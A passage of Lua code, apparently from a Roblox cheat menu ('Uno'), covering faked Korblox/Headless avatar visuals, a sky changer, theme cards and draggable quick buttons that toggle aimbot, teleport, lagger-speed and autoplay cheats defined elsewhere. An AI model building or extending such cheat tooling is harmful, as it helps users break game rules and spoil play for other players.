		local ok, objects = pcall(function() return game:GetObjects("rbxassetid://139607673") end)
		if not ok or not objects or not objects[1] then
			warn("Uno Korblox: no se pudo cargar el asset 139607673")
			return false
		end
		local oldVisual = character:FindFirstChild("UnoVisual_Korblox")
		if oldVisual then pcall(function() oldVisual:Destroy() end) end
		for _, child in ipairs(character:GetChildren()) do
			if child:IsA("CharacterMesh") and child.Name == "UnoVisual_KorbloxCharacterMesh" then
				pcall(function() child:Destroy() end)
			end
		end
		local visual = Instance.new("Model")
		visual.Name = "UnoVisual_Korblox"
		for _, object in ipairs(objects) do object.Parent = visual end
		local importedParts = {}
		for _, descendant in ipairs(visual:GetDescendants()) do
			if descendant:IsA("BasePart") then table.insert(importedParts, descendant) end
		end
		local characterMeshes = {}
		for _, descendant in ipairs(visual:GetDescendants()) do
			if descendant:IsA("CharacterMesh") then table.insert(characterMeshes, descendant) end
		end
		if #importedParts == 0 and #characterMeshes == 0 then
			visual:Destroy()
			warn("Uno Korblox: el asset 139607673 no contiene piezas compatibles")
			return false
		end
		if not saved then
			saved = {parts = {}}
			for _, partName in ipairs({"LeftUpperLeg", "LeftLowerLeg", "LeftFoot", "Left Leg"}) do
				local part = character:FindFirstChild(partName)
				if part and part:IsA("BasePart") then
					table.insert(saved.parts, {part = part, transparency = part.Transparency, localTransparency = part.LocalTransparencyModifier})
				end
			end
			appearanceState.korblox[character] = saved
		end
		visual.Parent = character
		local isR15 = character:FindFirstChild("LeftUpperLeg") ~= nil
		if isR15 then
			for _, partState in ipairs(saved.parts) do
				if partState.part and partState.part.Parent then
					partState.part.Transparency = 1
					partState.part.LocalTransparencyModifier = 1
				end
			end
		end
		for _, part in ipairs(importedParts) do
			local matchingTarget = character:FindFirstChild(part.Name)
			if not matchingTarget or not matchingTarget:IsA("BasePart") then matchingTarget = target end
			part.Anchored = false
			part.CanCollide = false
			part.Massless = true
			part.CFrame = matchingTarget.CFrame
			local weld = Instance.new("WeldConstraint")
			weld.Part0 = matchingTarget
			weld.Part1 = part
			weld.Parent = part
		end
		for _, mesh in ipairs(characterMeshes) do
			mesh.Name = "UnoVisual_KorbloxCharacterMesh"
			mesh.Parent = character
		end
		return true
	end
	FeaturePostToggle["Headless Visual"] = function(active)
		appearanceState.setHeadless(active == true, Player.Character)
	end
	FeaturePostToggle["Korblox Visual"] = function(active)
		task.spawn(appearanceState.setKorblox, active == true, Player.Character)
	end
	_G.__UnoTrackConn(Player.CharacterAdded:Connect(function(character)
		task.wait(0.75)
		if toggleStates["Headless Visual"] then appearanceState.setHeadless(true, character) end
		if toggleStates["Korblox Visual"] then appearanceState.setKorblox(true, character) end
	end))
	if toggleStates["Headless Visual"] then task.delay(0.5, appearanceState.setHeadless, true, Player.Character) end
	if toggleStates["Korblox Visual"] then task.delay(0.5, appearanceState.setKorblox, true, Player.Character) end
	end

	do
	local skyOrigLighting = {
	Ambient = Lighting.Ambient,
	Brightness = Lighting.Brightness,
	ClockTime = Lighting.ClockTime,
	FogColor = Lighting.FogColor,
	FogEnd = Lighting.FogEnd,
	GlobalShadows = Lighting.GlobalShadows,
	EnvironmentDiffuseScale = Lighting.EnvironmentDiffuseScale,
	EnvironmentSpecularScale = Lighting.EnvironmentSpecularScale,
	OutdoorAmbient = Lighting.OutdoorAmbient,
	}
	local skyActiveColorCorr = nil
	skyCurrentMode = _G.__UnoSkyChangerMode or "blue"

	local function clearSkyColorCorr()
	if skyActiveColorCorr then
	pcall(function() skyActiveColorCorr:Destroy() end)
	skyActiveColorCorr = nil
	end
	end

	local function restoreSkyLighting()
	clearSkyColorCorr()
	pcall(function()
	Lighting.Ambient = skyOrigLighting.Ambient
	Lighting.Brightness = skyOrigLighting.Brightness
	Lighting.ClockTime = skyOrigLighting.ClockTime
	Lighting.FogColor = skyOrigLighting.FogColor
	Lighting.FogEnd = skyOrigLighting.FogEnd
	Lighting.GlobalShadows = skyOrigLighting.GlobalShadows
	Lighting.EnvironmentDiffuseScale = skyOrigLighting.EnvironmentDiffuseScale
	Lighting.EnvironmentSpecularScale = skyOrigLighting.EnvironmentSpecularScale
	Lighting.OutdoorAmbient = skyOrigLighting.OutdoorAmbient
	end)
	end

	function applySky(kind)
	if kind == nil or kind == "none" then
	restoreSkyLighting()
	return
	end

	clearSkyColorCorr()
	local cc = Instance.new("ColorCorrectionEffect")
	cc.Parent = Lighting
	skyActiveColorCorr = cc

	if kind == "blue" then
	Lighting.Ambient = Color3.fromRGB(30, 60, 120)
	Lighting.FogColor = Color3.fromRGB(40, 80, 160)
	cc.TintColor = Color3.fromRGB(140, 180, 255)
	cc.Saturation = 0.4
	cc.Contrast = 0.1
	elseif kind == "night" then
	Lighting.ClockTime = 0
	Lighting.Brightness = 0.2
	Lighting.Ambient = Color3.fromRGB(20, 20, 35)
	cc.TintColor = Color3.fromRGB(180, 180, 220)
	cc.Saturation = -0.2
	cc.Contrast = 0.1
	elseif kind == "day" then
	Lighting.ClockTime = 14
	Lighting.Brightness = 2
	Lighting.Ambient = Color3.fromRGB(140, 140, 140)
	cc.TintColor = Color3.fromRGB(255, 255, 255)
	cc.Saturation = 0.1
	cc.Contrast = 0
	end
	end

	FeaturePostToggle["Sky Changer"] = function(active)
	if active then
	applySky(skyCurrentMode)
	else
	restoreSkyLighting()
	end
	end

	local skyChangerToggle = makeToggleNoKeybind(visualSection, "Sky Changer", "Sky Changer")
	if skyChangerToggle then
	local skyModeBtn = Instance.new("TextButton", skyChangerToggle)
	skyModeBtn.Name = "SkyModeBtn"
	skyModeBtn.Size = UDim2.new(0, 66, 0, 20)
	skyModeBtn.Position = UDim2.new(1, -74, 0.5, -10)
	skyModeBtn.AnchorPoint = Vector2.new(0, 0)
	skyModeBtn.BackgroundColor3 = Color3.fromRGB(30,30,38)
	skyModeBtn.BorderSizePixel = 0
	skyModeBtn.Text = "BLUE"
	skyModeBtn.TextColor3 = Color3.fromRGB(225,238,255)
	skyModeBtn.Font = Enum.Font.GothamBold
	skyModeBtn.TextSize = isMobile and 8 or 9
	skyModeBtn.AutoButtonColor = false
	skyModeBtn.ZIndex = 30
	Instance.new("UICorner", skyModeBtn).CornerRadius = UDim.new(0, 4)
	local skyModeStroke = Instance.new("UIStroke", skyModeBtn)
	skyModeStroke.Color = Color3.fromRGB(255,255,255)
	skyModeStroke.Thickness = 1
	skyModeStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	local function updateSkyModeBtn()
	local label = skyCurrentMode == "day" and "DAY" or skyCurrentMode == "night" and "NIGHT" or "BLUE"
	skyModeBtn.Text = label
	skyModeBtn.BackgroundColor3 = Color3.fromRGB(30,30,38)
	skyModeBtn.TextColor3 = Color3.fromRGB(225,238,255)
	skyModeStroke.Color = Color3.fromRGB(255,255,255)
	skyModeStroke.Thickness = 1
	skyModeBtn.TextStrokeTransparency = 1
	end
	updateSkyModeBtn()
	connectBtn(skyModeBtn, function()
	if skyCurrentMode == "day" then
	skyCurrentMode = "blue"
	elseif skyCurrentMode == "blue" then
	skyCurrentMode = "night"
	else
	skyCurrentMode = "day"
	end
	_G.__UnoSkyChangerMode = skyCurrentMode
	saveConfig()
	updateSkyModeBtn()
	if toggleStates["Sky Changer"] then
	applySky(skyCurrentMode)
	end
	end)
	end

	if toggleStates["Sky Changer"] then
	task.delay(0.2, function() applySky(skyCurrentMode) end)
	end
	end

	makeToggleNoKeybind(visualSection, "Show Buttons", "Show Buttons")
	makeToggleNoKeybind(visualSection, "Lock Buttons", "Lock Buttons")

	do
	local mainThemesBtnContainer = Instance.new("Frame", visualSection)
	mainThemesBtnContainer.Name = "MainThemesBtnContainer"
	mainThemesBtnContainer.Visible = true
	mainThemesBtnContainer.Size = UDim2.new(1, 0, 0, 30)
	mainThemesBtnContainer.BackgroundTransparency = 1
	mainThemesBtnContainer.BorderSizePixel = 0
	mainThemesBtnContainer.ZIndex = 12
	mainThemesBtnContainer.LayoutOrder = 20

	local mainThemesBtn = Instance.new("TextButton", mainThemesBtnContainer)
	mainThemesBtn.Name = "MainThemesBtn"
	mainThemesBtn.AnchorPoint = Vector2.new(0.5, 0)
	mainThemesBtn.Size = UDim2.new(0, 150, 0, 30)
	mainThemesBtn.Position = UDim2.new(0.5, 0, 0, 0)
	mainThemesBtn.BackgroundColor3 = Color3.fromRGB(30,30,38)
	mainThemesBtn.BackgroundTransparency = 0.12
	mainThemesBtn.AutoButtonColor = false
	mainThemesBtn.Font = Enum.Font.GothamBold
	mainThemesBtn.Text = "Colors"
	mainThemesBtn.TextColor3 = Color3.fromRGB(235,240,245)
	mainThemesBtn.TextSize = 11
	mainThemesBtn.ZIndex = 12
	mainThemesBtn.TextXAlignment = Enum.TextXAlignment.Center
	mainThemesBtn.TextYAlignment = Enum.TextYAlignment.Center
	Instance.new("UICorner", mainThemesBtn).CornerRadius = UDim.new(0, 8)
	local mainThemesBtnStroke = Instance.new("UIStroke", mainThemesBtn)
	mainThemesBtnStroke.Color = Color3.fromRGB(255,255,255)
	mainThemesBtnStroke.Thickness = 1.2
	mainThemesBtnStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	mainThemesBtnStroke.Transparency = 0.15

	local mainThemesFrame = Instance.new("Frame")
	mainThemesFrame.Name = "MainThemesPanel"
	mainThemesFrame.Size = UDim2.fromOffset(260, 268)
	mainThemesFrame.BackgroundColor3 = Color3.fromRGB(48, 92, 138)
	mainThemesFrame.BorderSizePixel = 0
	mainThemesFrame.Visible = false
	mainThemesFrame.ZIndex = 20
	mainThemesFrame.Parent = ScreenGui
	local themesGradient = Instance.new("UIGradient", mainThemesFrame)
	themesGradient.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(38, 75, 118)),
	ColorSequenceKeypoint.new(0.48, Color3.fromRGB(67, 120, 174)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(34, 67, 108)),
	})
	themesGradient.Rotation = 35

	local function positionMainThemesPanel()
	if Panel then
	local panelX = Panel.Position.X.Offset + Panel.Size.X.Offset
	mainThemesFrame.Position = UDim2.new(
	Panel.Position.X.Scale,
	panelX + 24,
	Panel.Position.Y.Scale,
	Panel.Position.Y.Offset + 6
	)
	end
	end
	if Panel then
	Panel:GetPropertyChangedSignal("Position"):Connect(function()
	if _G.__UnoModernGuiActive or not mainThemesFrame.Parent then return end
	if mainThemesFrame.Visible then positionMainThemesPanel() end
	end)
	Panel:GetPropertyChangedSignal("Size"):Connect(function()
	if _G.__UnoModernGuiActive or not mainThemesFrame.Parent then return end
	if mainThemesFrame.Visible then positionMainThemesPanel() end
	end)

	local mainThemesWasOpen = false
	Panel:GetPropertyChangedSignal("Visible"):Connect(function()
	if _G.__UnoModernGuiActive or not mainThemesFrame.Parent then return end
	if not Panel.Visible then
	if mainThemesFrame.Visible then
	mainThemesWasOpen = true
	mainThemesFrame.Visible = false
	else
	mainThemesWasOpen = false
	end
	else
	if mainThemesWasOpen then
	positionMainThemesPanel()
	mainThemesFrame.Visible = true
	end
	end
	end)
	end
	Instance.new("UICorner", mainThemesFrame).CornerRadius = UDim.new(0, 12)
	local themesStroke = Instance.new("UIStroke", mainThemesFrame)
	themesStroke.Color = Color3.fromRGB(0, 0, 0)
	themesStroke.Thickness = 0
	themesStroke.Transparency = 1

	local pendingBackground = bgIndex or 1
	local themeCards = {}
	local function refreshMainThemeCards()
	for index, data in ipairs(themeCards) do
	local selected = index == pendingBackground
	local card = data.card
	local image = data.image
	local stroke = data.stroke
	local baseX, baseY = data.baseX, data.baseY
	local baseW, baseH = data.baseW, data.baseH

	stroke.Color = Color3.fromRGB(255, 255, 255)
	stroke.Thickness = selected and 2 or 1.5
	stroke.Transparency = selected and 0.25 or 0.7
	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

	card.Size = selected and UDim2.fromOffset(math.max(4, baseW - 6), math.max(4, baseH - 6)) or UDim2.fromOffset(baseW, baseH)
	card.Position = selected and UDim2.new(0, baseX + 3, 0, baseY + 3) or UDim2.new(0, baseX, 0, baseY)
	card.BackgroundTransparency = 1
	image.Size = UDim2.new(1, 0, 1, 0)
	image.Position = UDim2.new(0, 0, 0, 0)
	image.BackgroundTransparency = 1
	end
	end

	local function layoutMainThemeCards()
	if not mainThemesFrame or not themeCards then return end
	local frameW = mainThemesFrame.AbsoluteSize.X > 0 and mainThemesFrame.AbsoluteSize.X or mainThemesFrame.Size.X.Offset
	local frameH = mainThemesFrame.AbsoluteSize.Y > 0 and mainThemesFrame.AbsoluteSize.Y or mainThemesFrame.Size.Y.Offset
	local paddingX = 12
	local paddingY = 12
	local gapX = 10
	local gapY = 10
	local safeBottom = 36
	local usableW = math.max(0, frameW - paddingX * 2)
	local usableH = math.max(0, frameH - safeBottom - paddingY * 2)
	local cardW = math.floor((usableW - gapX) / 2)
	local cardH = math.floor((usableH - gapY) / 2)

	for index, data in ipairs(themeCards) do
	local col = ((index - 1) % 2)
	local row = math.floor((index - 1) / 2)
	local x = paddingX + col * (cardW + gapX)
	local y = paddingY + row * (cardH + gapY)
	data.baseX = x
	data.baseY = y
	data.baseW = cardW
	data.baseH = cardH
	data.card.Size = UDim2.fromOffset(cardW, cardH)
	data.card.Position = UDim2.new(0, x, 0, y)
	data.image.Size = UDim2.new(1, 0, 1, 0)
	data.image.Position = UDim2.new(0, 0, 0, 0)
	end
	end

	for index, imageId in ipairs(backgroundIds) do
	local card = Instance.new("TextButton", mainThemesFrame)
	card.BackgroundColor3 = Color3.fromRGB(30,30,38)
	card.BackgroundTransparency = 1
	card.BorderSizePixel = 0
	card.Text = ""
	card.AutoButtonColor = false
	card.ZIndex = 21
	Instance.new("UICorner", card).CornerRadius = UDim.new(0, 7)
	local cardImage = Instance.new("ImageLabel", card)
	cardImage.BackgroundTransparency = 1
	cardImage.Image = imageId
	cardImage.ScaleType = Enum.ScaleType.Crop
	cardImage.ZIndex = 21
	Instance.new("UICorner", cardImage).CornerRadius = UDim.new(0, 7)
	local cardLabel = Instance.new("TextLabel", card)
	cardLabel.Size = UDim2.new(1, -12, 0, 12)
	cardLabel.Position = UDim2.new(0, 6, 1, -14)
	cardLabel.BackgroundTransparency = 1
	cardLabel.Text = "GUI " .. tostring(index)
	cardLabel.TextColor3 = Color3.fromRGB(235,240,245)
	cardLabel.TextSize = 8
	cardLabel.Font = Enum.Font.GothamBold
	cardLabel.ZIndex = 23
	cardLabel.TextStrokeColor3 = Color3.fromRGB(5, 12, 25)
	cardLabel.TextStrokeTransparency = 0.25
	local cardStroke = Instance.new("UIStroke", card)
	cardStroke.Color = Color3.fromRGB(255,255,255)
	cardStroke.Thickness = 0
	cardStroke.Transparency = 1
	cardStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	table.insert(themeCards, {
	card = card,
	image = cardImage,
	stroke = cardStroke,
	baseX = 0,
	baseY = 0,
	baseW = 0,
	baseH = 0,
	})
	card.Activated:Connect(function()
	pendingBackground = index
	refreshMainThemeCards()
	end)
	end

	local saveThemeButton = Instance.new("TextButton", mainThemesFrame)
	saveThemeButton.Size = UDim2.new(1, -24, 0, 28)
	saveThemeButton.Position = UDim2.new(0, 12, 1, -44)

	pcall(function() layoutMainThemeCards() end)
	mainThemesFrame:GetPropertyChangedSignal("AbsoluteSize"):Connect(function()
	pcall(layoutMainThemeCards)
	end)
	saveThemeButton.BackgroundColor3 = Color3.fromRGB(120,180,240)
	saveThemeButton.BorderSizePixel = 0
	saveThemeButton.Text = "Apply Color"
	saveThemeButton.TextColor3 = Color3.fromRGB(235,240,245)
	saveThemeButton.TextSize = 11
	saveThemeButton.Font = Enum.Font.GothamBold
	saveThemeButton.ZIndex = 21
	Instance.new("UICorner", saveThemeButton).CornerRadius = UDim.new(0, 7)
	saveThemeButton.Activated:Connect(function()
	bgIndex = pendingBackground
	if BgImage then BgImage.Image = backgroundIds[bgIndex] end
	mainThemesFrame.Visible = false
	if HeaderBgBtn then pcall(function() HeaderBgBtn.Text = tostring(bgIndex) .. "/" .. tostring(#backgroundIds) end) end
	_G["_UnoHub_UI_BgIndex"] = bgIndex
	if _G.__UnoApplyCurtVisualTheme then pcall(_G.__UnoApplyCurtVisualTheme, bgIndex) end
	saveConfig()
	end)

	mainThemesBtn.Activated:Connect(function()
	pendingBackground = bgIndex
	positionMainThemesPanel()
	mainThemesFrame.Visible = not mainThemesFrame.Visible
	refreshMainThemeCards()
	end)

	if HeaderBgBtn then pcall(function() HeaderBgBtn.Visible = false end) end
	end

	do
	local oldQuickButtons = _G.__UnoQuickButtonsFrame
	if oldQuickButtons then pcall(function() oldQuickButtons:Destroy() end) end

	local quickButtons = Instance.new("Frame")
	quickButtons.Name = "UnoQuickButtons"
	quickButtons.Size = UDim2.new(1, 0, 1, 0)
	quickButtons.Position = UDim2.new(0, 0, 0, 0)
	quickButtons.BackgroundTransparency = 1
	quickButtons.BorderSizePixel = 0
	quickButtons.Active = false
	quickButtons.ZIndex = 750
	quickButtons.Visible = toggleStates["Show Buttons"] == true
	quickButtons.Parent = ScreenGui
	_G.__UnoQuickButtonsFrame = quickButtons

	local function makeQuickButton(label, order)
	local button = Instance.new("TextButton")
	button.Name = label:gsub("%s+", "") .. "Button"
	local sizeScale = Instance.new("UIScale", button)
	sizeScale.Name = "QuickButtonSizeScale"
	sizeScale.Scale = _G.__UnoButtonsSize or 1

	local BTN_W = 72
	local BTN_H = 58
	local buttonGap = 7
	local CORNER_R = 12
	button.Size = UDim2.new(0, BTN_W, 0, BTN_H)

	local baseY = (isMobile and 72 or 81)
	local leftX = isMobile and 12 or 16
	if order <= 3 then
	button.Position = UDim2.new(0, leftX, 0, baseY + (order - 1) * (BTN_H + buttonGap))
	else
	local idx = (order - 4)
	button.Position = UDim2.new(0, leftX + BTN_W + buttonGap, 0, baseY + idx * (BTN_H + buttonGap))
	end
	button.LayoutOrder = order
	button:SetAttribute("OriginalPosition", button.Position)
	button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	button.BackgroundTransparency = 0
	button.BorderSizePixel = 0
	button.AutoButtonColor = false
	button.Active = true
	button.Draggable = false
	button.Font = Enum.Font.GothamBold
	button.Text = label
	button.TextScaled = true
	button.TextWrapped = true
	button.TextColor3 = Color3.fromRGB(255, 255, 255)
	button.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
	button.TextStrokeTransparency = 0.35
	button.ZIndex = 751
	button.Parent = quickButtons
	Instance.new("UICorner", button).CornerRadius = UDim.new(0, CORNER_R)
	local textSizeConstraint = Instance.new("UITextSizeConstraint")
	textSizeConstraint.MinTextSize = 11
	textSizeConstraint.MaxTextSize = 15
	textSizeConstraint.Parent = button
	local stroke = Instance.new("UIStroke")
	stroke.Color = Color3.fromRGB(0, 0, 0)
	stroke.Thickness = 1.2
	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	stroke.Transparency = 0.2
	stroke.Parent = button
	return button, stroke
	end

	local aimbotButton, aimbotStroke = makeQuickButton("AIMBOT", 1)
	local autoBatButton, autoBatStroke = makeQuickButton("BAT TP", 2)
	local tpDownButton, tpDownStroke = makeQuickButton("TP DOWN", 3)
	local dropButton, dropStroke = makeQuickButton("DROP", 4)
	local carrySpeedButton, carrySpeedStroke = makeQuickButton("CARRY SPEED", 5)
	local speedModeButton, speedModeStroke = makeQuickButton("LAGGER SPEED", 6)
	local autoplayButton, autoplayStroke = makeQuickButton("AUTO PLAY", 7)
	local quickTapBlocked = {}
	quickTapBlocked.custom = {}
	quickTapBlocked.custom.button, quickTapBlocked.custom.stroke = makeQuickButton("CUSTOM SPEED", 8)

	quickTapBlocked.custom.button.Visible = true

	quickTapBlocked.custom.getByName = function(name)
	for _, customSpeed in ipairs(customSpeeds) do
	if customSpeed.name == name then return customSpeed end
	end
	return nil
	end

	quickTapBlocked.custom.getSelected = function()
	local selectedCustomSpeed = quickTapBlocked.custom.getByName(selectedMode)
	if selectedCustomSpeed then
	quickTapBlocked.custom.lastName = selectedCustomSpeed.name
	return selectedCustomSpeed
	end
	return quickTapBlocked.custom.getByName(quickTapBlocked.custom.lastName) or customSpeeds[1]
	end

	local function setQuickVisual(button, stroke, active)

	if active then
	local accent = typeof(_G.__UnoCurtAccent) == "Color3" and _G.__UnoCurtAccent or Color3.fromRGB(220, 70, 70)
	button.BackgroundColor3 = accent
	button.BackgroundTransparency = 0
	button.TextColor3 = Color3.fromRGB(20, 6, 2)
	button.TextStrokeTransparency = 0.5
	stroke.Color = accent:Lerp(Color3.fromRGB(255, 255, 255), 0.24)
	stroke.Thickness = 1.6
	stroke.Transparency = 0.1
	else
	button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	button.BackgroundTransparency = 0
	button.TextColor3 = Color3.fromRGB(255, 255, 255)
	button.TextStrokeTransparency = 0.35
	stroke.Color = Color3.fromRGB(0, 0, 0)
	stroke.Thickness = 1.2
	stroke.Transparency = 0.2
	end
	end

	local function toggleQuickFeature(featureName)
	local blockedWhileStealing = {}
	local newState = not (toggleStates[featureName] == true)
	if newState and blockedWhileStealing[featureName] and Player:GetAttribute("Stealing") == true then
	return
	end
	toggleStates[featureName] = newState
	if toggleStateSetters[featureName] then pcall(toggleStateSetters[featureName], newState) end
	if FeaturePostToggle[featureName] then pcall(FeaturePostToggle[featureName], newState) end
	saveConfig()
	end

	local movableButtons = {
	aimbotButton, autoBatButton, tpDownButton,
	dropButton, carrySpeedButton, speedModeButton, autoplayButton, quickTapBlocked.custom.button,
	}

	task.defer(function()
	for _, button in ipairs(movableButtons) do
	local saved = quickButtonPositions[button.Name]
	if saved and saved.x and saved.y then
	local x, y = placeInsideViewport(button, 0, saved.x, 0, saved.y, _G.__UnoButtonsSize or 1)
	button.Position = UDim2.new(0, x, 0, y)
	quickButtonPositions[button.Name] = { x = x, y = y }
	else
	local position = button.Position
	placeInsideViewport(button, position.X.Scale, position.X.Offset, position.Y.Scale, position.Y.Offset, _G.__UnoButtonsSize or 1)
	end
	end
	end)

	local draggingQuickButton = nil
	local quickDragStart = nil
	local quickDragPosition = nil
	local quickDragInput = nil

	local quickDragMoved = false
	_G.__UnoSetButtonsSize = function(value)
		local size = tonumber((tostring(value):gsub(",", ".")))
		if not size or size ~= size or math.abs(size) == math.huge then return _G.__UnoButtonsSize end
		size = math.floor(math.clamp(size, 0.5, 2) * 100 + 0.5) / 100
		_G.__UnoButtonsSize = size
		draggingQuickButton, quickDragStart, quickDragPosition, quickDragInput = nil, nil, nil, nil
		quickDragMoved = false
		for _, button in ipairs(movableButtons) do
			button.QuickButtonSizeScale.Scale = size
			local position = button.Position
			local x, y = placeInsideViewport(button, position.X.Scale, position.X.Offset, position.Y.Scale, position.Y.Offset, size)
			if quickButtonPositions[button.Name] then quickButtonPositions[button.Name] = {x = x, y = y} end
		end
		saveConfig()
		return size
	end
	quickTapBlocked.resetPositions = function()

	if draggingQuickButton then
	local button = draggingQuickButton
	quickTapBlocked[button] = true
	task.delay(0.2, function() quickTapBlocked[button] = nil end)
	end
	draggingQuickButton = nil
	quickDragStart = nil
	quickDragPosition = nil
	quickDragInput = nil
	quickDragMoved = false
	table.clear(quickButtonPositions)
	for _, button in ipairs(movableButtons) do
	local position = button:GetAttribute("OriginalPosition")
	placeInsideViewport(button, position.X.Scale, position.X.Offset, position.Y.Scale, position.Y.Offset, _G.__UnoButtonsSize or 1)
	end
	_G.__UnoGuiPositionsReset = true
	for _, resetPosition in pairs(_G.__UnoGuiPositionResetters) do
	resetPosition()
	end
	saveConfig()
	end
	_G.__UnoResetButtonPositions = quickTapBlocked.resetPositions
	local function quickButtonsAreLocked()
	return toggleStates["Lock Buttons"] == true
	end
	local function updateQuickButtonPosition(input)
	if not draggingQuickButton or not quickDragStart or not quickDragPosition then return end
	local delta = input.Position - quickDragStart
	if delta.Magnitude > 6 then
	quickDragMoved = true
	end
	local viewport = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(0, 0)
	local size = draggingQuickButton.AbsoluteSize
	local x = math.clamp(quickDragPosition.X.Offset + delta.X, 0, math.max(0, viewport.X - size.X))
	local y = math.clamp(quickDragPosition.Y.Offset + delta.Y, 0, math.max(0, viewport.Y - size.Y))
	draggingQuickButton.Position = UDim2.new(0, x, 0, y)
	end
	for _, button in ipairs(movableButtons) do
	button.InputBegan:Connect(function(input)
	if quickButtonsAreLocked() then return end
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
	draggingQuickButton = button
	quickDragStart = input.Position
	quickDragPosition = button.Position
	quickDragInput = input
	quickDragMoved = false
	end
	end)
	end
	_G.__UnoTrackConn(UserInputService.InputChanged:Connect((function(input)
	if not draggingQuickButton or quickButtonsAreLocked() then return end
	if input.UserInputType == Enum.UserInputType.MouseMovement or input == quickDragInput then
	updateQuickButtonPosition(input)
	end
	end)))
	_G.__UnoTrackConn(UserInputService.InputEnded:Connect(function(input)
	local isMouseRelease = quickDragInput and quickDragInput.UserInputType == Enum.UserInputType.MouseButton1 and input.UserInputType == Enum.UserInputType.MouseButton1
	if draggingQuickButton and (input == quickDragInput or isMouseRelease) then
	local movedButton = draggingQuickButton
	draggingQuickButton = nil
	quickDragStart = nil
	quickDragPosition = nil
	quickDragInput = nil
	if quickDragMoved then
	quickButtonPositions[movedButton.Name] = {
	x = movedButton.Position.X.Offset,
	y = movedButton.Position.Y.Offset,
	}
	saveConfig()

	quickTapBlocked[movedButton] = true
	task.delay(0.2, function()
	quickTapBlocked[movedButton] = nil
	end)
	end
	end
	end))

	local function connectQuickButton(button, callback)
	button.Activated:Connect(function()
	if quickTapBlocked[button] then
	quickTapBlocked[button] = nil
	return
	end
	callback()
	end)
	end
	connectQuickButton(aimbotButton, function() toggleQuickFeature("Aimbot") end)
	connectQuickButton(autoBatButton, function()

	if _G.UnoAutoBat and _G.UnoAutoBat.Toggle then
	pcall(_G.UnoAutoBat.Toggle)
	else
	toggleQuickFeature("TP Bat")
	end
	end)
	connectQuickButton(tpDownButton, function()
	if FeatureToggles["TP Down"] then pcall(FeatureToggles["TP Down"]) end
	end)
	connectQuickButton(dropButton, function()
	if FeatureToggles["Drop"] then pcall(FeatureToggles["Drop"], "button") end
	end)
	connectQuickButton(carrySpeedButton, function()

	if carrySpeedMode == "v2" then
	speedToggled = not speedToggled
	toggleStates["Carry Speed"] = speedToggled

	toggleStates["Speed Boost"] = true
	if _G.__refreshSpeedBoost then pcall(_G.__refreshSpeedBoost) end
	if toggleVisualUpdaters["Carry Speed"] then toggleVisualUpdaters["Carry Speed"]() end
	pcall(function() if _G.__refreshSpeedBillboards then _G.__refreshSpeedBillboards() end end)
	saveConfig()
	elseif FeatureToggles["Carry Speed"] then
	pcall(FeatureToggles["Carry Speed"])
	else
	toggleQuickFeature("Carry Speed")
	end
	end)
	connectQuickButton(speedModeButton, function()
	if selectedMode == "Lagger" then
	if FeatureToggles["SelectNormalMode"] then pcall(FeatureToggles["SelectNormalMode"]) end
	else
	if FeatureToggles["SelectLaggerMode"] then pcall(FeatureToggles["SelectLaggerMode"]) end
	end
	end)
	connectQuickButton(autoplayButton, function()
	if FeatureToggles["Autoplay"] then
	pcall(FeatureToggles["Autoplay"])
	end
	end)
	connectQuickButton(quickTapBlocked.custom.button, function()
	local customSpeed = quickTapBlocked.custom.getSelected()
	if customSpeed and selectedMode ~= customSpeed.name then
	selectMode(customSpeed.name)
	end
	end)
	local quickUpdateAccumulator = 0
	local quickLast = {}
	_G.__UnoRefreshQuickButtonTheme = function()
		quickLast = {}
	end
	_G.__UnoTrackConn(RunService.Heartbeat:Connect((function(dt)
	quickUpdateAccumulator = quickUpdateAccumulator + (dt or 0)
	if quickUpdateAccumulator < 0.40 then return end
	quickUpdateAccumulator = 0
	local showButtons = toggleStates["Show Buttons"] == true
	if quickLast.show ~= showButtons then quickButtons.Visible = showButtons; quickLast.show = showButtons end
	if not showButtons then return end
	local aimbotActive = toggleStates["Aimbot"] == true
	local autoBatActive = toggleStates["TP Bat"] == true
	local carryActive = toggleStates["Carry Speed"] == true
	local autoplayIsActive = toggleStates["Autoplay"] == true
	local activeCustomSpeed = quickTapBlocked.custom.getByName(selectedMode)
	local quickCustomSpeed = activeCustomSpeed or quickTapBlocked.custom.getSelected()
	if quickLast.carryVisible ~= true then carrySpeedButton.Visible = true; quickLast.carryVisible = true end
	if quickLast.aimbot ~= aimbotActive then setQuickVisual(aimbotButton, aimbotStroke, aimbotActive); quickLast.aimbot = aimbotActive end
	if quickLast.autoBat ~= autoBatActive then setQuickVisual(autoBatButton, autoBatStroke, autoBatActive); quickLast.autoBat = autoBatActive end
	if quickLast.carry ~= carryActive then setQuickVisual(carrySpeedButton, carrySpeedStroke, carryActive); quickLast.carry = carryActive end
	if quickLast.autoplay ~= autoplayIsActive then setQuickVisual(autoplayButton, autoplayStroke, autoplayIsActive); quickLast.autoplay = autoplayIsActive end
	local customSpeedName = quickCustomSpeed and quickCustomSpeed.name or nil
	if quickLast.customName ~= customSpeedName or quickLast.customActive ~= (activeCustomSpeed ~= nil) then
	quickTapBlocked.custom.button.Text = customSpeedName and ("CUSTOM\n" .. string.upper(customSpeedName)) or "NO CUSTOM"
	setQuickVisual(quickTapBlocked.custom.button, quickTapBlocked.custom.stroke, activeCustomSpeed ~= nil)
	quickLast.customName = customSpeedName
	quickLast.customActive = activeCustomSpeed ~= nil
	end
	local isLaggerSpeed = selectedMode == "Lagger"
	if quickLast.lagger ~= isLaggerSpeed then
	speedModeButton.Text = isLaggerSpeed and "NORMAL SPEED" or "LAGGER SPEED"
	setQuickVisual(speedModeButton, speedModeStroke, isLaggerSpeed)
	quickLast.lagger = isLaggerSpeed
	end
	if quickLast.actionsInitialized ~= true then
	setQuickVisual(tpDownButton, tpDownStroke, false)
	setQuickVisual(dropButton, dropStroke, false)
